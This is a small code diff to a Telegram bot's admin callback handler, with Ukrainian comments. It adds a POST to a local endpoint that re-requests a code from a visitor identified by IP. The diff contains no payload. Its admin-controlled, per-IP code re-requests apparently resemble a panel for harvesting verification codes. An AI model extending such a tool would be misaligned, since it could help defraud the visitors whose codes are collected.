@@ -1422,6 +1422,10 @@ async def admin_action_handler(call: types.CallbackQuery):
         await call.answer("Введіть текст повідомлення:")
         user_step[call.from_user.id] = f'text_for_{ip}'
     elif action == 'code_request_again':
+        # Надсилаємо POST на /set_request_again з кодом
+        import aiohttp as aiohttp_client
+        async with aiohttp_client.ClientSession() as session:
+            await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
         await call.answer("Код запитується знову")
 
 
